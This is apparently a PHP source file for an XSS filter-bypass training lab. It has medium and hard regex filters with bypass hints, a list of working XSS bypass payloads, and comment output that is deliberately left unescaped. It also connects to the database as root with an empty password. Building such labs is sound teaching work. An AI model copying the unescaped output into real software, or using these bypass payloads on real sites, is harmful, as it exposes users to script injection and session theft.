<?php
// XSS Lab 2 - Advanced Filter Bypass Training
// Levels: Medium (Basic Filters) | Hard (Advanced WAF)

require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/score_manager.php'); 
session_start();

$server = "127.0.0.1";
$user = "root";
$password = "";
$dbname = "darkhunter_db";

try {
    $conn = mysqli_connect($server, $user, $password, $dbname);
    if (!$conn) {
        throw new Exception("Connection failed: " . mysqli_connect_error());
    }
} catch (Exception $e) {
    die("Database connection error: " . $e->getMessage());
}

// Create table if not exists
$create_table_sql = "CREATE TABLE IF NOT EXISTS xss_lab2_comments (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(255) NOT NULL,
    comment TEXT NOT NULL,
    level INT DEFAULT 1,
    bypass_detected TINYINT DEFAULT 0,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)";
mysqli_query($conn, $create_table_sql);

// Level selection
$level = isset($_GET['level']) ? intval($_GET['level']) : 1;
$level = ($level < 1 || $level > 2) ? 1 : $level;

// Get input
$comment = isset($_POST['comment']) ? $_POST['comment'] : "";
$name = isset($_POST['name']) ? $_POST['name'] : "Anonymous";

$blocked = false;
$bypass_detected = false;
$filter_logs = [];
$encoded_payload = "";
$waf_score = 0;

// ==================== FILTER DEFINITIONS ====================

// Level 1: Medium - Basic Filters
$medium_filters = [
    'script_tag' => [
        'pattern' => '/<script\b[^>]*>.*?<\/script>/is',
        'description' => 'Script tags blocked',
        'bypass_hint' => 'Try: <scr<script>ipt> or <ScRiPt>'
    ],
    'alert_blocked' => [
        'pattern' => '/alert\s*\(/i',
        'description' => 'alert() function blocked',
        'bypass_hint' => 'Try: prompt() or confirm() or String.fromCharCode'
    ],
    'on_events' => [
        'pattern' => '/\s(on\w+)\s*=\s*["\']?[^"\']*["\']?/i',
        'description' => 'Event handlers blocked',
        'bypass_hint' => 'Try: onerror with different quotes or SVG tags'
    ],
    'javascript_proto' => [
        'pattern' => '/javascript\s*:/i',
        'description' => 'javascript: protocol blocked',
        'bypass_hint' => 'Try: data:text/html or vbscript:'
    ],
];

// Level 2: Hard - Advanced WAF + Encoding Detection
$hard_filters = [
    'case_insensitive_script' => [
        'pattern' => '/<[\s\/]*script\b/i',
        'description' => 'All script variations blocked (case-insensitive)',
        'bypass_hint' => 'Try: Double encoding or <img/src=x>'
    ],
    'all_events' => [
        'pattern' => '/on\w+\s*=/i',
        'description' => 'All event handlers blocked',
        'bypass_hint' => 'Try: onerror without = or CSS injection'
    ],
    'encoding_detection' => [
        'pattern' => '/(%[0-9a-fA-F]{2})+|(&#[0-9]+;)+|(\\x[0-9a-fA-F]{2})+/i',
        'description' => 'Encoded payloads detected',
        'bypass_hint' => 'Try: Nested encoding or different base'
    ],
    'parentheses_blocked' => [
        'pattern' => '/[()]/',
        'description' => 'Parentheses () blocked',
        'bypass_hint' => 'Try: backticks or throw with template literals'
    ],
    'single_quotes' => [
        'pattern' => "/'/",
        'description' => 'Single quotes blocked',
        'bypass_hint' => 'Try: Double quotes or backticks'
    ],
    'double_quotes' => [
        'pattern' => '/"/',
        'description' => 'Double quotes blocked',
        'bypass_hint' => 'Try: Single quotes or no quotes'
    ],
    'angle_brackets' => [
        'pattern' => '/[<>]/',
        'description' => 'HTML tags blocked',
        'bypass_hint' => 'Try: Unicode entities or JS without tags'
    ],
];

// Select active filters
$active_filters = ($level == 2) ? $hard_filters : $medium_filters;

// ==================== FILTER ENGINE ====================

function applyFilters($input, $filters, &$logs, &$score) {
    $blocked = false;
    $modified_input = $input;
    
    foreach ($filters as $filter_name => $filter_data) {
        if (preg_match($filter_data['pattern'], $modified_input)) {
            $logs[] = [
                'filter' => $filter_name,
                'description' => $filter_data['description'],
                'hint' => $filter_data['bypass_hint'],
                'blocked_part' => $modified_input
            ];
            $score += 10;
            $blocked = true;
            
            // Apply the filter (remove matched content)
            $modified_input = preg_replace($filter_data['pattern'], '[BLOCKED]', $modified_input);
        }
    }
    
    return [$blocked, $modified_input];
}

// Apply filters
$filtered_comment = $comment;
if ($comment !== "") {
    list($blocked, $filtered_comment) = applyFilters($comment, $active_filters, $filter_logs, $waf_score);
    
    // Check for bypass attempts (if original != filtered but still contains dangerous chars)
    if ($blocked && $filtered_comment !== $comment) {
        // Check if bypass succeeded (dangerous content still executable)
        $dangerous_patterns = '/(alert|prompt|confirm|eval|document\.cookie|window\.location)/i';
        if (preg_match($dangerous_patterns, $filtered_comment) || 
            preg_match('/<[^>]+>/', $filtered_comment)) {
            $bypass_detected = true;
        }
    }
    
    // Store if not completely blocked
    if (!$blocked || $bypass_detected) {
        // Use prepared statement properly
        $stmt = mysqli_prepare($conn, "INSERT INTO xss_lab2_comments (name, comment, level, bypass_detected, created_at) VALUES (?, ?, ?, ?, NOW())");
        if ($stmt) {
            $bypass_flag = $bypass_detected ? 1 : 0;
            mysqli_stmt_bind_param($stmt, "ssii", $name, $comment, $level, $bypass_flag);
            mysqli_stmt_execute($stmt);
            mysqli_stmt_close($stmt);
        }
        
        // Update score if bypass detected
        if ($bypass_detected && isset($_SESSION['user_id'])) {
            $lab_id = ($level == 2) ? 10 : 9; // 9 for Medium, 10 for Hard
            solveLab($pdo, $lab_id);
        }
    }
}

// Fetch comments for this level - FIXED VERSION
$comments = [];
// Use simple query instead of prepared statement for fetching
$level_safe = intval($level);
$query = "SELECT * FROM xss_lab2_comments WHERE level = $level_safe ORDER BY created_at DESC LIMIT 20";
$result = mysqli_query($conn, $query);

if ($result) {
    while ($row = mysqli_fetch_assoc($result)) {
        $comments[] = $row;
    }
}

// Calculate security score
$security_rating = 100 - ($waf_score > 100 ? 100 : $waf_score);
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>XSS Lab 2 | Advanced Bypass Training</title>
  <link rel="stylesheet" type="text/css" href="css/newxsslab2.css">
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600;800&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

</head>

<body>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/navbar.php'; ?>

  <!-- Background Effects -->
  <div class="circuit-lines"></div>
  <div class="matrix-bg" id="matrix"></div>

  <script>
  // Create floating particles
  for (let i = 0; i < 20; i++) {
    const particle = document.createElement('div');
    particle.className = 'particle';
    particle.style.left = Math.random() * 100 + '%';
    particle.style.animationDelay = Math.random() * 15 + 's';
    particle.style.animationDuration = (10 + Math.random() * 10) + 's';
    document.body.appendChild(particle);
  }
  </script>

  <div class="container">
    <a href="index.php" class="back-link"
      style="display: inline-flex; align-items: center; gap: 8px; margin-bottom: 20px; color: var(--neon-cyan); text-decoration: none; font-family: 'JetBrains Mono', monospace; font-size: 0.9rem; transition: all 0.3s ease;">
      <i class="fas fa-arrow-left"></i> Back to Labs
    </a>


    <!-- Header -->
    <div class="lab-header">
      <div class="lab-title">
        <div class="lab-icon">🛡️</div>
        <div class="lab-info">
          <h1>XSS_LAB_V2.0</h1>
          <p>Advanced Filter Bypass Training Environment</p>
        </div>
      </div>

      <div class="level-selector">
        <button class="level-btn medium <?php echo $level == 1 ? 'active' : ''; ?>"
          onclick="window.location.href='?level=1'">
          ⚡ Medium
        </button>
        <button class="level-btn hard <?php echo $level == 2 ? 'active' : ''; ?>"
          onclick="window.location.href='?level=2'">
          🔥 Hard
        </button>
      </div>
    </div>

    <div class="main-grid">
      <!-- Main Content -->
      <div class="left-column">
        <!-- Input Card -->
        <div class="card">
          <div class="card-header">
            <div class="card-title">
              <span>⚔️</span>
              Payload Injection Terminal
            </div>
            <span style="font-size: 0.8rem; color: var(--neon-<?php echo $level == 2 ? 'red' : 'yellow'; ?>);">
              <?php echo $level == 2 ? '🔒 WAF PROTECTION: MAXIMUM' : '🔒 WAF PROTECTION: STANDARD'; ?>
            </span>
          </div>

          <form method="POST" action="?level=<?php echo $level; ?>">
            <div class="input-area">
              <div class="input-group">
                <label class="input-label">
                  <span>👤</span> Operator ID
                </label>
                <div class="input-field">
                  <input type="text" name="name" placeholder="Enter codename..."
                    value="<?php echo htmlspecialchars($name); ?>">
                </div>
              </div>

              <div class="input-group">
                <label class="input-label">
                  <span>💉</span> Injection Vector
                </label>
                <div class="input-field">
                  <textarea name="comment" id="payloadInput"
                    placeholder="<?php echo $level == 2 ? 'Try: <img src=x onerror=alert&#40;1&#41;>' : '<script>alert(1)</script>'; ?>"><?php echo htmlspecialchars($comment); ?></textarea>
                </div>
              </div>
            </div>

            <?php if ($level == 2): ?>
            <div class="waf-panel">
              <div class="waf-header">
                <span class="waf-title">🛡️ Active Defense Systems</span>
                <span class="waf-score">Threat Level: CRITICAL</span>
              </div>
              <div class="filter-list">
                <?php foreach ($hard_filters as $key => $filter): ?>
                <div class="filter-item">
                  <span class="filter-status"></span>
                  <span class="filter-name"><?php echo $filter['description']; ?></span>
                </div>
                <?php endforeach; ?>
              </div>
            </div>
            <?php else: ?>
            <div class="waf-panel" style="background: rgba(255, 204, 0, 0.05); border-color: rgba(255, 204, 0, 0.2);">
              <div class="waf-header">
                <span class="waf-title" style="color: var(--neon-yellow);">⚠️ Standard Filters Active</span>
                <span class="waf-score" style="background: rgba(255, 204, 0, 0.2); color: var(--neon-yellow);">Level:
                  MEDIUM</span>
              </div>
              <div class="filter-list">
                <?php foreach ($medium_filters as $key => $filter): ?>
                <div class="filter-item" style="border-left-color: var(--neon-yellow);">
                  <span class="filter-status"
                    style="background: var(--neon-yellow); box-shadow: 0 0 8px var(--neon-yellow);"></span>
                  <span class="filter-name"><?php echo $filter['description']; ?></span>
                </div>
                <?php endforeach; ?>
              </div>
            </div>
            <?php endif; ?>

            <button type="submit" class="execute-btn">
              EXECUTE_INJECTION()
            </button>
          </form>

          <?php if ($comment !== ""): ?>
          <div class="results-area">
            <?php if ($bypass_detected): ?>
            <div class="bypass-badge">
              🏆 BYPASS SUCCESSFUL! WAF EVADED
            </div>
            <?php endif; ?>

            <?php if ($blocked && !$bypass_detected): ?>
            <div class="result-box">
              <div class="result-label">❌ Injection Blocked</div>
              <div class="result-content blocked">
                <?php echo htmlspecialchars($filtered_comment); ?>
              </div>
            </div>

            <div class="result-box">
              <div class="result-label">🔍 Filter Logs</div>
              <div class="result-content" style="font-size: 0.8rem;">
                <?php foreach ($filter_logs as $log): ?>
                <div style="margin-bottom: 12px; padding: 10px; background: rgba(255, 0, 64, 0.1); border-radius: 6px;">
                  <div style="color: var(--neon-red); font-weight: 600;"><?php echo $log['description']; ?></div>
                  <div style="color: rgba(255,255,255,0.6); margin-top: 4px; font-size: 0.75rem;">
                    💡 Hint: <?php echo $log['hint']; ?>
                  </div>
                </div>
                <?php endforeach; ?>
              </div>
            </div>
            <?php elseif (!$blocked || $bypass_detected): ?>
            <div class="result-box">
              <div class="result-label">✅ Payload Executed</div>
              <div class="result-content success">
                <?php echo $comment; // VULNERABLE - NO ESCAPING ?>
              </div>
            </div>
            <?php endif; ?>
          </div>
          <?php endif; ?>
        </div>

        <!-- Comments History -->
        <div class="card" style="margin-top: 24px;">
          <div class="card-header">
            <div class="card-title">
              <span>📊</span>
              Injection History
            </div>
            <span class="comment-count"
              style="padding: 4px 12px; background: rgba(255,255,255,0.1); border-radius: 20px; font-size: 0.8rem;">
              <?php echo count($comments); ?> records
            </span>
          </div>

          <div class="comments-feed">
            <?php if (empty($comments)): ?>
            <div class="empty-state">
              <div class="empty-icon">🕸️</div>
              <p>No injection attempts recorded</p>
            </div>
            <?php else: ?>
            <?php foreach ($comments as $c): ?>
            <div class="comment-item <?php echo $c['bypass_detected'] ? 'bypassed' : ''; ?>">
              <div class="comment-header">
                <span class="comment-author"><?php echo htmlspecialchars($c['name']); ?></span>
                <span class="comment-level <?php echo $c['level'] == 2 ? 'hard' : 'medium'; ?>">
                  <?php echo $c['level'] == 2 ? '🔥 Hard' : '⚡ Medium'; ?>
                </span>
              </div>
              <div class="comment-body">
                <?php echo $c['comment']; // VULNERABLE DISPLAY ?>
              </div>
              <?php if ($c['bypass_detected']): ?>
              <div style="margin-top: 8px; font-size: 0.75rem; color: var(--neon-pink);">
                🏆 WAF Bypass Detected
              </div>
              <?php endif; ?>
            </div>
            <?php endforeach; ?>
            <?php endif; ?>
          </div>
        </div>
      </div>

      <!-- Sidebar -->
      <div class="right-column">
        <!-- Hints -->
        <div class="card sidebar-section">
          <div class="hint-card">
            <div class="hint-title">🎯 Current Mission</div>
            <div class="hint-text">
              <?php if ($level == 1): ?>
              Bypass basic filters using encoding variations, case manipulation, and alternative tags.
              <?php else: ?>
              Break through advanced WAF using double encoding, Unicode tricks, and polyglot payloads.
              <?php endif; ?>
            </div>
          </div>

          <div class="hint-card" style="background: rgba(0, 255, 136, 0.05); border-color: rgba(0, 255, 136, 0.2);">
            <div class="hint-title" style="color: var(--neon-green);">💡 Pro Tips</div>
            <div class="hint-text">
              <?php if ($level == 1): ?>
              • Use mixed case: &lt;ScRiPt&gt;<br>
              • Try HTML entities: &amp;#60;script&amp;#62;<br>
              • Alternative tags: &lt;img&gt;, &lt;svg&gt;, &lt;iframe&gt;
              <?php else: ?>
              • Double URL encode: %253C for &lt;<br>
              • Unicode escapes: \u003c \u003e<br>
              • Template literals: ${alert(1)}<br>
              • JS without parentheses: alert\`1\`
              <?php endif; ?>
            </div>
          </div>
        </div>

        <!-- Payload Arsenal -->
        <div class="card sidebar-section">
          <div class="card-header" style="margin-bottom: 16px;">
            <div class="card-title">
              <span>🧰</span>
              Payload Arsenal
            </div>
          </div>

          <div class="payload-list">
            <?php if ($level == 1): ?>
            <div class="payload-item" onclick="loadPayload('<scr<script>ipt>alert(1)</scr</script>ipt>')">
              &lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;
            </div>
            <div class="payload-item" onclick="loadPayload('<ScRiPt>alert(1)</ScRiPt>')">
              &lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
            </div>
            <div class="payload-item" onclick="loadPayload('<img src=x onerror=alert(1)>')">
              &lt;img src=x onerror=alert(1)&gt;
            </div>
            <div class="payload-item" onclick="loadPayload('<svg onload=alert(1)>')">
              &lt;svg onload=alert(1)&gt;
            </div>
            <div class="payload-item" onclick="loadPayload('javascript:alert(1)')">
              javascript:alert(1)
            </div>
            <?php else: ?>
            <div class="payload-item" onclick="loadPayload('<img src=x onerror=alert&#40;1&#41;>')">
              &lt;img src=x onerror=alert&amp;#40;1&amp;#41;&gt;
            </div>
            <div class="payload-item" onclick="loadPayload('\u003cimg src=x onerror=alert(1)\u003e')">
              \u003cimg src=x onerror=alert(1)\u003e
            </div>
            <div class="payload-item" onclick="loadPayload('<svg onload=prompt(1)>')">
              &lt;svg onload=prompt(1)&gt;
            </div>
            <div class="payload-item" onclick="loadPayload('alert`1`')">
              alert\`1\` (backticks)
            </div>
            <div class="payload-item" onclick="loadPayload('(alert)(1)')">
              (alert)(1) - parentheses trick
            </div>
            <div class="payload-item"
              onclick="loadPayload('<iframe src=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>')">
              Hex encoded iframe
            </div>
            <?php endif; ?>
          </div>

          <div class="encoding-tools">
            <button class="tool-btn" onclick="encodePayload('url')">URL Encode</button>
            <button class="tool-btn" onclick="encodePayload('html')">HTML Entities</button>
            <button class="tool-btn" onclick="encodePayload('unicode')">Unicode</button>
            <button class="tool-btn" onclick="encodePayload('double')">Double Encode</button>
          </div>
        </div>

        <!-- Score Card -->
        <div class="card sidebar-section">
          <div class="card-header" style="margin-bottom: 16px;">
            <div class="card-title">
              <span>🏆</span>
              Your Stats
            </div>
          </div>

          <div style="text-align: center; padding: 20px;">
            <div
              style="font-size: 3rem; font-weight: 800; background: linear-gradient(135deg, var(--neon-green), var(--neon-cyan)); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">
              <?php 
                        $bypass_count = array_reduce($comments, function($carry, $item) {
                            return $carry + ($item['bypass_detected'] ? 1 : 0);
                        }, 0);
                        echo $bypass_count;
                        ?>
            </div>
            <div style="color: rgba(255,255,255,0.6); font-size: 0.9rem; margin-top: 8px;">
              Successful Bypasses
            </div>
          </div>

          <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 16px;">
            <div style="text-align: center; padding: 12px; background: rgba(255, 204, 0, 0.1); border-radius: 8px;">
              <div style="font-size: 1.5rem; color: var(--neon-yellow); font-weight: 700;">
                <?php echo count(array_filter($comments, function($c) { return $c['level'] == 1; })); ?>
              </div>
              <div style="font-size: 0.75rem; color: rgba(255,255,255,0.6);">Medium</div>
            </div>
            <div style="text-align: center; padding: 12px; background: rgba(255, 0, 64, 0.1); border-radius: 8px;">
              <div style="font-size: 1.5rem; color: var(--neon-red); font-weight: 700;">
                <?php echo count(array_filter($comments, function($c) { return $c['level'] == 2; })); ?>
              </div>
              <div style="font-size: 0.75rem; color: rgba(255,255,255,0.6);">Hard</div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <script>
  function loadPayload(payload) {
    document.getElementById('payloadInput').value = payload;
    document.getElementById('payloadInput').focus();

    // Visual feedback
    const input = document.getElementById('payloadInput');
    input.style.borderColor = '#00ff88';
    input.style.boxShadow = '0 0 20px rgba(0, 255, 136, 0.3)';

    setTimeout(() => {
      input.style.borderColor = '';
      input.style.boxShadow = '';
    }, 800);
  }

  function encodePayload(type) {
    const input = document.getElementById('payloadInput');
    let text = input.value;
    if (!text) return;

    let encoded = '';
    switch (type) {
      case 'url':
        encoded = encodeURIComponent(text);
        break;
      case 'html':
        encoded = text.replace(/[<>&"']/g, function(m) {
          return '&#' + m.charCodeAt(0) + ';';
        });
        break;
      case 'unicode':
        encoded = text.split('').map(c => '\\u' + ('0000' + c.charCodeAt(0).toString(16)).slice(-4)).join('');
        break;
      case 'double':
        encoded = encodeURIComponent(encodeURIComponent(text));
        break;
    }

    input.value = encoded;
    input.style.borderColor = '#0088ff';
    setTimeout(() => {
      input.style.borderColor = '';
    }, 500);
  }

  // Real-time WAF simulation
  document.getElementById('payloadInput').addEventListener('input', function(e) {
    const value = e.target.value;
    const dangerous = /(<script|alert\(|on\w+=|javascript:)/i;

    if (dangerous.test(value)) {
      e.target.style.borderColor = value.length > 20 ? '#ff0040' : '#ffcc00';
    } else {
      e.target.style.borderColor = '';
    }
  });
  </script>

</body>

</html>